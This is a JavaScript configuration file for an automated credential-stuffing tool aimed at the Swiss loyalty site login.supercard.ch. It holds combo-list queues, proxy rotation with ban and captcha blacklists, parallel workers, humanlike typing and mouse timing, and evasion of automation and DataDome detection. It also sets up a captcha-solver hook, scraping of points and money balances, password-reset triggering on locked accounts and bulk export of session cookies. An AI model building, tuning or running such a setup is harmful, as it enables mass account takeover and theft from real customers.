/**
 * Centralized Configuration for play_version2_improved.js
 * All magic numbers and settings in one place
 */

module.exports = {
  "activeProfile": "balanced",
  "browser": {
    "timeout": 180000,
    "gracefulKillWait": 15000,
    "headless": false,
    "channel": "chrome",
    "dumpio": false,
    "allowInsecureWebSecurity": false,
    "args": [
      "--proxy-server={PROXY}",
      "--disable-dev-shm-usage",
      "--disable-blink-features=AutomationControlled",
      "--disable-features=VizDisplayCompositor,OptimizationGuideModelDownloading,OptimizationHintsFetching,OptimizationTargetPrediction,OptimizationHints,PasswordLeakDetection,PasswordCheck",
      "--disable-ipc-flooding-protection",
      "--disable-renderer-backgrounding",
      "--disable-backgrounding-occluded-windows",
      "--disable-field-trial-config",
      "--log-level=3",
      "--password-store=basic",
      "--use-mock-keychain",
      "--disable-save-password-bubble",
      "--no-first-run",
      "--no-default-browser-check",
      "--no-service-autorun",
      "--disable-default-apps",
      "--disable-component-update",
      "--disable-notifications",
      "--disable-popup-blocking",
      "--disable-component-extensions-with-background-pages",
      "--disable-plugins-discovery"
    ],
    "ignoreDefaultArgs": [
      "--enable-automation",
      "--enable-blink-features=IdleDetection"
    ],
    "adaptiveTimeout": {
      "initial": 180000,
      "perCredential": 30000,
      "captchaRetry": 60000
    },
    "resourceBlocking": {
      "enabled": false,
      "blockTypes": [
        "image",
        "font",
        "media"
      ],
      "blockThirdParty": false,
      "allowList": [
        "login.supercard.ch",
        "www.supercard.ch",
        "cas/login",
        "cas/oidc"
      ]
    },
    "userAgent": "",
    "userAgentOverride": false,
    "viewport": {
      "width": 1920,
      "height": 1080,
      "randomize": false
    },
    "locale": "de-CH",
    "timezone": "Europe/Zurich"
  },
  "proxy": {
    "blacklistTTL": 600000,
    "blacklistTTLs": {
      "tcp_unreachable": 300000,
      "captcha_triggered": 300000,
      "bot_check_triggered": 600000,
      "rate_limited": 1200000,
      "ip_banned": 3600000,
      "proxy_auth_failed": 120000,
      "default": 600000
    },
    "tcpTimeout": 3000,
    "attemptsBeforeGiveUp": 5
  },
  "batch": {
    "credentialsPerProxy": 7,
    "maxParallelWorkers": 7,
    "pauseBetweenBatchMin": 200,
    "pauseBetweenBatchMax": 1200,
    "finishWaitMin": 800,
    "finishWaitMax": 2500,
    "shuffleCredentials": false,
    "cooldownAfterBlock": 60000,
    "maxConsecutiveFailures": 10,
    "adaptiveWorkers": {
      "enabled": false,
      "minWorkers": 1,
      "maxWorkers": 8,
      "scaleUpThreshold": 0.8,
      "scaleDownThreshold": 0.3
    }
  },
  "form": {
    "typeDelayMin": 80,
    "typeDelayMax": 160,
    "pauseBetweenCredsMin": 500,
    "pauseBetweenCredsMax": 1500
  },
  "userBehavior": {
    "randomMouseMovement": {
      "enabled": true,
      "beforeFormFill": {
        "enabled": true,
        "movements": 2,
        "delayMin": 50,
        "delayMax": 100
      },
      "duringFormFill": {
        "enabled": false,
        "movements": 2,
        "delayMin": 100,
        "delayMax": 300
      },
      "afterSubmit": {
        "enabled": true,
        "movements": 1,
        "delayMin": 75,
        "delayMax": 150
      }
    }
  },
  "navigation": {
    "timeout": 10000,
    "domWaitUntil": "domcontentloaded",
    "shortRetryWait": 200,
    "waitForLoadState": "domcontentloaded",
    "disableReloadOnFirstAttempt": true
  },
  "login": {
    "url": "https://login.supercard.ch/",
    "usernameSelector": "#username",
    "passwordSelector": "#password",
    "submitMethod": "random",
    "submitSelectors": [
      "#btnSubmit",
      "button[type=\"submit\"]",
      "button.btn-primary",
      "button.loginbtn",
      "button.btn.btn-blue",
      "input[type=\"submit\"]"
    ],
    "submitXPath": "/html/body/div[1]/main/div/div/div[1]/div[1]/div/div/form/button",
    "onetrust": "#onetrust-accept-btn-handler",
    "accountTab": "#a-accountLogin-desktop > span.text",
    "recaptcha": {
      "enabled": false,
      "selectors": [
        ".g-recaptcha",
        "iframe[src*=\"recaptcha\"]",
        "div[data-sitekey]"
      ],
      "callbackFunction": "onRecaptchaV2Submit",
      "version": "v2"
    },
    // buttonOpacity removed — submit path now uses native button.isEnabled()
    // instead of page.evaluate()-based opacity checks (which DataDome detects).
    "rememberMeCheckbox": "#remember-me",
    "forgotPasswordLink": "a[href*=\"forgot\"]",
    "errorMessageSelector": ".alert.alert-danger, .error, [role=\"alert\"]",
    "successIndicator": ".success-message, [class*=\"success\"]",
    "retryFirstCredential": true,
    "retryFirstCredentialMaxAttempts": 2,
    "retryFirstCredentialOnReasons": [
      "invalid_credentials",
      "no_success_indicator",
      "detection_timeout"
    ]
  },
  "account": {
    "url": "https://www.supercard.ch/de/mein-konto.html",
    "logoutPhrases": [
      "Abmelden",
      "Logout",
      "Sign out",
      "Log out"
    ],
    "sessionVerificationPhrases": [
      "abmelden",
      "logout",
      "mein konto",
      "my account"
    ],
    "logoutSelectors": [
      "a[href*=\"logout\"]",
      "a[href*=\"signout\"]",
      "a.logout",
      "button.logout",
      "button[title*=\"Abmelden\"]",
      "a[title*=\"Abmelden\"]"
    ],
    "logoutPostDelay": 2000,
    "logoutRetryAttempts": 3,
    "logoutRetryDelay": 1000,
    "logoutTimeout": 5000,
    "balanceSelectors": {
      "points": "span.myPointBalance-value",
      "money": "span.myMoneyBalance-value",
      "timeout": 3000
    },
    "cookiePopupSelectors": [
      "button[data-testid=\"uc-accept-all-button\"]",
      "button.sc-gsFSXq.gsSmVB",
      "#uc-center-container button:nth-child(2)",
      "#onetrust-accept-btn-handler",
      "button[id*=\"cookie-accept\"]",
      "button[id*=\"cookie-consent\"]",
      "[class*=\"cookie-accept\"]",
      "[class*='accept-all']",
      "[data-testid*='accept']",
      "button[aria-label*='akzeptieren']",
      "button[aria-label*='accept']",
      ".privacy-modal button.accept-all",
      "[class*='privatsphare'] button",
      "[id*='privacy'] button[class*='accept']",
      "div[class*='cmp'] button[class*='accept']",
      "button[data-action='accept-all']"
    ],
    "newsletterPopupSelectors": {
      "dismissTexts": ["Nein, danke", "No thanks", "Nicht jetzt", "Not now"],
      "closeSelectors": [
        "button[aria-label=\"Close\"]",
        "button[aria-label=\"Schliessen\"]",
        "button[aria-label=\"schliessen\"]",
        ".modal-close",
        "[data-dismiss=\"modal\"]",
        "button.close"
      ]
    }
  },
  "detection": {
    "blockPhrases": [
      "Der Zugriff ist vorübergehend eingeschränkt"
    ],
    "accountBlockPhrases": [],
    "suspiciousBehaviorPhrase": "Etwas im Verhalten des Browsers hat uns stutzig gemacht.",
    "botCheckPhrase": "Wir vergewissern uns, dass wir es wirklich mit Ihnen zu tun haben, und nicht mit einem Roboter.",
    "captchaPhrase": "Wir vergewissern uns, dass wir es wirklich mit Ihnen zu tun haben, und nicht mit einem Roboter.",
    "invalidCredentialsPhrase": "Bitte überprüfen Sie Ihre Eingaben und versuchen Sie es erneut.",
    "accountLockPhrase": "Ihr Konto wurde aufgrund von zu vielen Loginversuchen temporär gesperrt. Zum Freischalten setzen Sie jetzt ihr Passwort zurück",
    "cas": {
      "loginPath": "/cas/login",
      "callbackPath": "callbackAuthorize",
      "ticketPattern": null, // intentionally null; consumers must null-check before calling .test()
      "oidcAuthorize": "/cas/oidc/authorize",
      "timeout": 8000,
      "useEventDrivenDetection": true,
      "adaptiveTimeout": {
        "enabled": true,
        "minTimeout": 2000,
        "maxSamples": 30,
        "bufferMultiplier": 1.3
      }
    },
    "blockDetection": {
      "statusCodes": [
        400,
        401,
        403,
        404,
        500,
        502,
        503
      ]
    },
    "confidenceThresholds": {
      "tgc_cookie": {
        "minConfidence": 0.99,
        "category": "TGC_COOKIE"
      },
      "cas_ticket": {
        "minConfidence": 0.99,
        "category": "REDIRECT_302"
      },
      "oidc": {
        "minConfidence": 0.95,
        "category": "REDIRECT_OIDC"
      },
      "body_token": {
        "minConfidence": 0.9,
        "category": "BODY_TOKEN"
      },
      "set_cookie": {
        "minConfidence": 0.85,
        "category": "SET_COOKIE"
      }
    },
    "minimumSuccessConfidence": 0.85
  },
  "output": {
    "failedFile": "ichfiggdinimueter.txt",
    "pageLoadErrorFile": "pageLoadErrors.txt",
    "badProxiesFile": "bad_proxies.txt",
    "unlockRequestedFile": "unlock_requested.txt"
  },
  "passwordReset": {
    "enabled": true,
    "resetLinkPhrases": [
      "Passwort zurücksetzen",
      "Passwort vergessen",
      "Forgot password",
      "Reset password",
      "jetzt ihr Passwort zurück"
    ],
    "resetLinkSelectors": [
      "a[href*='forgot']",
      "a[href*='reset']",
      "a[href*='password']",
      "a[href*='passwort']"
    ],
    "emailSelector": "#email, #username, input[type='email'], input[name='email'], input[name='username']",
    "submitSelectors": [
      "button[type='submit']",
      "input[type='submit']",
      "button.btn-primary"
    ],
    "submitPhrases": [
      "Absenden",
      "Senden",
      "Submit",
      "Zurücksetzen",
      "Reset"
    ],
    "confirmationPhrases": [
      "E-Mail wurde gesendet",
      "Email has been sent",
      "Überprüfen Sie Ihr Postfach",
      "Check your inbox",
      "Passwort zurücksetzen Link",
      "erfolgreich"
    ],
    "navigationTimeout": 10000,
    "confirmationTimeout": 5000,
    "formLoadDelay": 1500,
    "captchaHandling": {
      "enabled": false,
      "strategy": "skip",
      "screenshotOnCaptcha": true,
      "screenshotDir": "screenshots/captcha",
      "solverService": null,
      "solverApiKey": "",
      "maxSolveAttempts": 2,
      "solveTimeout": 120000,
      "pauseTimeout": 120000,
      "captchaSelectors": [
        "iframe[src*='recaptcha']",
        "iframe[src*='captcha-delivery.com']",
        ".g-recaptcha",
        "div[data-sitekey]",
        "#recaptcha",
        "iframe[src*='hcaptcha']",
        ".h-captcha"
      ],
      "consentSelectors": [
        "button:has-text('Alle akzeptieren')",
        "button:has-text('Accept all')",
        "#onetrust-accept-btn-handler",
        ".consent-accept",
        "button[data-testid='consent-accept']"
      ]
    }
  },
  "logging": {
    "enableStructuredLogging": true,
    "logLevel": "debug",
    "enableMetrics": true,
    "metricsInterval": 30000,
    "logNetworkTraffic": false,
    "logBlockedResources": false,
    "colorize": true,
    "timestamps": true,
    "logRotation": {
      "enabled": false,
      "maxFileSize": "10mb",
      "maxFiles": 5
    }
  },
  "casDetection": {
    "tgcCookieNames": [
      "TGC"
    ],
    "monitoringStrategies": {
      "tgc_cookie": {
        "enabled": true,
        "description": "CAS Ticket Granting Cookie (99% confidence)"
      },
      "redirect_location": {
        "enabled": true,
        "description": "Detect redirect to /cas/"
      },
      "set_cookie": {
        "enabled": true,
        "description": "Detect session/auth cookies"
      },
      "body_token": {
        "enabled": true,
        "description": "Look for token in response body"
      },
      "navigation_detected": {
        "enabled": true,
        "description": "Detect URL change"
      },
      "dom_username": {
        "enabled": true,
        "description": "Check if username in DOM"
      },
      "cookie_detect": {
        "enabled": true,
        "description": "Look for auth cookies"
      }
    },
    "fallbackStrategies": {
      "checkTGC": true,
      "checkDOM": true,
      "checkCookies": true,
      "checkLocalStorage": true
    }
  },
  "context": {
    "ignoreHTTPSErrors": true,
    "bypassCSP": true,
    "strictIsolation": true
  },
  "errorRecovery": {
    "maxRetries": 1,
    "retryStrategies": {
      "exponentialBackoff": true,
      "backoffBase": 1,
      "maxBackoffDelay": 30000
    },
    "tunnelErrorThreshold": 3
  },
  "test": {
    "patchrightTestEnabled": true,
    "testViewportWidth": 1893,
    "testViewportHeight": 1279,
    "testScreenshotPath": "patchright_login_page.png"
  },
  "retry": {
    "enabled": true,
    "maxRetries": 1,
    "queueFile": "retry_queue.json",
    "retryDelayMin": 5000,
    "retryDelayMax": 10000
  },
  "history": {
    "enabled": true,
    "historyFile": "combo_history.jsonl",
    "skipSuccessful": true,
    "skipFailed": false,
    "skipBlocked": false,
    "failedRetestAfterDays": 0,
    "blockedRetestAfterDays": 0
  },
  "session": {
    "enabled": true,
    "directory": "sessions",
    "maxAge": 86400000,
    "cleanupOnStart": true
  },
  "queue": {
    "enabled": true,
    "queueFile": "combo_queue.json",
    "randomize": false,
    "listDelay": 0,
    "listDelayJitter": 0,
    "autoFeed": true,
    "deduplication": {
      "enabled": true,
      "crossFile": true,
      "againstHistory": true,
      "caseSensitive": false
    },
    "defaultPriority": 3,
    "maxQueueSize": 0,
    "watchDirectory": "",
    "watchInterval": 30000
  },
  "ux": {
    "interactiveMode": true,
    "showDashboard": true,
    "dashboardRefreshInterval": 1000,
    "colorOutput": true
  },
  "performance": {
    "enableConnectionPool": true,
    "poolSize": 100,
    "autoTuneWorkers": true,
    "monitorInterval": 10000
  },
  "stability": {
    "enableHealthChecks": true,
    "healthCheckInterval": 30000,
    "enableAutoRecovery": true,
    "maxRecoveryAttempts": 1
  },
  "cookieExport": {
    "enabled": true,
    "exportDir": "CookieExports",
    "format": "sessionComplete",
    "exportMode": "datadome"
  },
  "bulkCookieGenerator": {
    "defaultAmount": 100,
    "allowedAmounts": [100, 500, 1000, 2000],
    "maxConcurrency": 5,
    "outputDir": "CookieExports",
    "headless": false,
    "delayBetweenCaptures": 500,
    "navigationTimeout": 12000
  }
};
